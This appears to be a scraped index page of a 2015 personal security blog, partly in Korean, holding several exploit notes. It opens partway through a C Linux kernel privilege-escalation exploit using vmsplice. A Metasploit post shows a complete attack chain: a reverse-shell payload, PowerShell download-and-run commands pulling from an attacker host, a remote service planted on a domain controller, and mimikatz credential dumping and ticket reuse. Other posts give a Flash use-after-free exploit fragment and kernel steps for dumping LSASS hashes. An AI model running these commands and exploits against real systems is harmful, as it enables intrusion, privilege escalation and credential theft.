</span><span class='line'> 
</span><span class='line'>    memset(map_addr, 0, map_size);
</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[2]);
</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[3]);
</span><span class='line'> 
</span><span class='line'>    pages[2]-&gt;flags    = 1 &lt;&lt; PG_compound;
</span><span class='line'>    pages[2]-&gt;private  = (unsigned long) pages[2];
</span><span class='line'>    pages[2]-&gt;count    = 1;
</span><span class='line'>    pages[3]-&gt;lru.next = (long) kernel_code;
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    pages[4] = *(void **) &(int[2]){PAGE_SIZE,0};
</span><span class='line'>    map_size = PAGE_SIZE;
</span><span class='line'>    map_addr = mmap(pages[4], map_size, PROT_READ | PROT_WRITE,
</span><span class='line'>                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
</span><span class='line'>    if (map_addr == MAP_FAILED)
</span><span class='line'>        die("mmap", errno);
</span><span class='line'>    memset(map_addr, 0, map_size);
</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[4]);
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    map_size = (PIPE_BUFFERS * 3 + 2) * PAGE_SIZE;
</span><span class='line'>    map_addr = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
</span><span class='line'>                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
</span><span class='line'>    if (map_addr == MAP_FAILED)
</span><span class='line'>        die("mmap", errno);
</span><span class='line'> 
</span><span class='line'>    memset(map_addr, 0, map_size);
</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    map_size -= 2 * PAGE_SIZE;
</span><span class='line'>    if (munmap(map_addr + map_size, PAGE_SIZE) &lt; 0)
</span><span class='line'>        die("munmap", errno);
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    if (pipe(pi) &lt; 0) die("pipe", errno);
</span><span class='line'>    close(pi[0]);
</span><span class='line'> 
</span><span class='line'>    iov.iov_base = map_addr;
</span><span class='line'>    iov.iov_len  = ULONG_MAX;
</span><span class='line'> 
</span><span class='line'>    signal(SIGPIPE, exit_code);
</span><span class='line'>    _vmsplice(pi[1], &iov, 1, 0);
</span><span class='line'>    die("vmsplice", errno);
</span><span class='line'>    return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/11/decrypting-nthash/">Decrypting Nthash</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-11T13:19:54+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:19 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content">
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/10/metasploit-web-delivery/">Metasploit: Web_delivery</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-10T09:33:08+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:33 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><ul>
<li><a href="http://www.slideshare.net/gentilkiwi/mimikatz-how-to-push-microsoft-to-change-some-little-stuff">mimikatz @ passwords#14</a></li>
<li><a href="http://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html">Mimikatz 2.0 - Golden Ticket Walkthrough</a></li>
<li><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">Abusing Microsoft Kerberos by Alva DUCKWALL &amp; Benjamin DELPY</a></li>
<li><a href="http://www.ietf.org/rfc/rfc4120.txt">Kerberos tickets</a></li>
<li><a href="http://www.ietf.org/rfc/rfc4757.txt">RFC4757</a></li>
<li><a href="http://msdn.microsoft.com/library/cc237917.aspx">Microsoft Specific PAC</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exploit(web_delivery) &gt; set TARGET 2
</span><span class='line'>exploit(web_delivery) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</span><span class='line'>exploit(web_delivery) &gt; set LHOST 172.16.3.76
</span><span class='line'>exploit(web_delivery) &gt; set LPORT 8686
</span><span class='line'>exploit(web_delivery) &gt; run
</span><span class='line'>[*] Exploit running as background job.
</span><span class='line'>
</span><span class='line'>[*] [...] Started reverse handler on 172.16.3.76:8686
</span><span class='line'>[*] [...] Using URL: http://0.0.0.0:8080/moKqrqIYh0
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>$ winexe -k DOMAIN //dc01 "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.3.76:8080/moKqrqIYh0'))"
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>meterpreter &gt; getsystem
</span><span class='line'>meterpreter &gt; getprivs
</span><span class='line'>meterpreter &gt; portfwd ...
</span><span class='line'>
</span><span class='line'>$ python forgeTGT.py ...
</span><span class='line'>$ wine mimikatz.exe "kerberos::clist TGT_... /export" exit
</span><span class='line'>
</span><span class='line'>meterpreter &gt; load kiwi
</span><span class='line'>meterpreter &gt; kerberos_ticket_use /root/git/....DOAMIN.kirbi
</span><span class='line'>meterpreter &gt; shell
</span><span class='line'>
</span><span class='line'>c:\&gt; sc \\dc01\ create psh binPath="cmd.exe /c powershell -nop -w hidden -c IEK ((new-object net.webclient).downloadstring('172.16.3.76:8080/moKqrqIYh0'))"
</span><span class='line'>c:\&gt; sc \\dc01\ start psh
</span><span class='line'>c:\&gt; sc \\dc01\ delete psh
</span><span class='line'>c:\&gt; exit
</span><span class='line'>
</span><span class='line'>meterpreter &gt; background
</span><span class='line'>meterpreter &gt; sessions -i ...
</span><span class='line'>meterpreter &gt; run post/windows/gather/hashdump
</span><span class='line'>meterpreter &gt; run post/windows/gather/credentials/credential_collector</span></code></pre></td></tr></table></div></figure>


<p>mimikatz</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mimikatz # sekurlsa::logonpasswords
</span><span class='line'>mimikatz # sekurlsa::ekeys
</span><span class='line'>mimikatz # lsadump::lsa /inject /name:krbtgt
</span><span class='line'>mimikatz # lsadump::lsa /inject /name:Administrator
</span><span class='line'>mimikatz # sekurlsa::pth /user:Administrator /domain:babo.local /ntlm:cc36...
</span><span class='line'>mimikatz # kerberos::list /export
</span><span class='line'>mimikatz # kerberos::ptt ticket.kirbi
</span><span class='line'>mimikatz # sekurlsa::tickets /export</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Kerberos::Overpass-the-hash</li>
<li><a href="http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx">Kerberos::Pass-the-ticket</a></li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/10/red-vs-blue-modern-active-directory-attacks/">Red vs. Blue: Modern Active Directory Attacks</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-10T09:08:51+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:08 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>From shakacon.org</p>

<p>Name: Sean Metcalf</p>

<p>Synopsis: While Kerberos &ldquo;Golden Tickets&rdquo; and &ldquo;Silver Tickets&rdquo; received a lot of press in the second half of 2014, there hasn&rsquo;t been much detail provided on how exactly they work, why they are successful, and how to mitigate them (other than: &ldquo;don&rsquo;t get pwned&rdquo;). Golden Tickets are the ultimate method for persistent, forever AD admin rights to a network since they are valid Kerberos tickets and can&rsquo;t be detected, right?</p>

<p>This talk covers the latest AD attack vectors and describes how to detect Golden Ticket usage. Provided are key indicators that can detect Kerberos attacks on your network, including Golden tickets, Silver tickets &amp; MS14-068 exploitation, as well as methods to identify, mitigate, and prevent common Active Directory attack vectors. When forged Kerberos tickets are used in AD, there are some interesting artifacts that can be identified. Yes, despite what you may have read on the internet, there are ways to detect Golden &amp; Silver Ticket usage!</p>

<p>Some of the topics covered:</p>

<ul>
<li>How attackers go fro mzero to (Domain) Admin</li>
<li>MS14-068: the vulnerability, the exploit, and the danger</li>
<li>&ldquo;SPN Scanning&rdquo; with PowerShell to identify potential targets without network scans (SQL, Exchange, FIM, webservers, etc)</li>
<li>Exploiting weak service account passwords as a regular AD user</li>
<li>Mimikatz, the attacker&rsquo;s multi-tool</li>
<li>Using Silver Tickets for stealthy persistence that won&rsquo;t be detected (until now)</li>
<li>Identifying forged Kerberos tickets (Golden &amp; Silver Tickets) on your network</li>
<li>Detecting offensive PowerShell tools like Invoke-Mimikatz</li>
<li>Active Directory attack mitigation</li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/09/hackingteams-flash-0day/">HackingTeam's Flash 0day</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-09T15:53:27+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:53 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>static var _ba:ByteArray;
</span><span class='line'>static var _va:Array;
</span><span class='line'>
</span><span class='line'>var a = new Array(90);
</span><span class='line'>for (var i: int; i &lt; 90; i+= 3) {
</span><span class='line'>    a[i] = new Class2(i);
</span><span class='line'>    a[i+1] = new ByteArray();
</span><span class='line'>    a[i+1].length = 0xfa0; // 4000
</span><span class='line'>    a[i+2] = new Class2(i+2)
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>a[0]: Class2(0)
</span><span class='line'>a[1]: ByteArray()
</span><span class='line'>a[2]: Class2(2)
</span><span class='line'>a[3]: Class2(3)
</span><span class='line'>a[4]: ByteArray()
</span><span class='line'>a[5]: Class2(5)
</span><span class='line'>a[6]: Class2(6)
</span><span class='line'>a[7]: ByteArray()
</span><span class='line'>...
</span><span class='line'>a[85]: ByteArray()
</span><span class='line'>a[86]: Class2(86)
</span><span class='line'>a[87]: Class2(87)
</span><span class='line'>a[88]: ByteArray()
</span><span class='line'>a[89]: Class2(89)
</span><span class='line'>
</span><span class='line'>prototype.valueOf =  function() {
</span><span class='line'>    _va = new Array(5)
</span><span class='line'>    _gc.push(_va)
</span><span class='line'>    _ba.length = 0x1100
</span><span class='line'>    for(var i:int;i&lt;_va.length;i++)
</span><span class='line'>        _va[i] = new Vector.&lt;uint&gt;(0x3f0)
</span><span class='line'>    return 0x40;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>var v:Vector.&lt;uint&gt;;
</span><span class='line'>for (i=85; i&gt;=0; i-=3) {
</span><span class='line'>    _ba = a[i];
</span><span class='line'>    _ba[3] = new MyClass(); // call MyClass()'s prototype.valueOf
</span><span class='line'>    if (_ba[3]!=0x0) throw new Error("can't cause UaF");</span></code></pre></td></tr></table></div></figure>


<p>valueOf() 의 ret 값이 vector length 에 씌여지기때문에,
_ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>

<p>UaF 가 성공했으면, _va[i] 의 4 번째 바이트가 0x40 으로 씌여진다.
이제 length 가 굉장히 길어진 Vector 가 탄생했다.
이 Vector 로 메모리의 허가받지 않은 영역을 read &amp; write 할 수 있다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/07/easy-local-windows-kernel-exploitation/">Easy Local Windows Kernel Exploitation</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-07T17:04:01+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:04 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf">Easy Local Windows Kernel Exploitation</a></p>

<h4>Nulling out ACLs</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_HEADER
</span><span class='line'>...
</span><span class='line'>+0x014 SecurityDescriptor : Ptr32 Void 
</span><span class='line'>+0x018 Body : _QUAD</span></code></pre></td></tr></table></div></figure>


<ol>
<li>NtQuerySystemInformation() 으로 target object 의 kernel 주소를 얻어낸다.</li>
<li>address - 4 (x86) or address - 8 (x64) 에다가 NULL 을 쓴다. (SecurityDescriptor 를 밀어버린다)</li>
<li>LSASS process 에 접근해서 hash 를 덤프한다.</li>
</ol>


<h4>SEP_TOKEN_PRIVILEGES 조작</h4>

<h4>EPROCESS 의 Token 구조체 조작</h4>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/30/re-packing-android-apk-files/">Re-packing Android APK Files</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-30T11:23:09+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>30</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:23 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>Packing &amp; Unpacking</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip On*.apk classes.dex
</span><span class='line'>java -mx512m -jar ./baksmali-2.0.3.jar classes.dex
</span><span class='line'>keytool -genkey -v -keystore my-release-key.keystore -alias babo -keyalg RSA -keysize 2048 -validity 10000
</span><span class='line'>java -mx512m -jar ./smali-2.0.3.jar out -o classes.dex
</span><span class='line'>zip -d On*.apk classes.dex
</span><span class='line'>zip -d On*.apk "META-INF/*"
</span><span class='line'>zip On*.apk classes.dex
</span><span class='line'>jarsigner -storepass &lt;password&gt; -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore On*.apk babo
</span><span class='line'>adb shell pm uninstall com.xxx.yyy.zzz
</span><span class='line'>adb install On*.apk</span></code></pre></td></tr></table></div></figure>


<h4>aapt</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>aapt dump WHAT file.apk [asset [asset ...]]
</span><span class='line'>  strings
</span><span class='line'>  badging
</span><span class='line'>  permissions
</span><span class='line'>  resources
</span><span class='line'>  configurations
</span><span class='line'>  xmltree
</span><span class='line'>  xmlstrings</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/6">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/4">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/06/13/poison-null-byte/">Poison NULL Byte</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/06/13/control-flow-enforcement-technology-preview/">Control-flow Enforcement Technology Preview</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/06/13/cve-2016-2468/">CVE-2016-2468</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/">Security Analysis of Emerging Smart Home Applications</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - KC -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
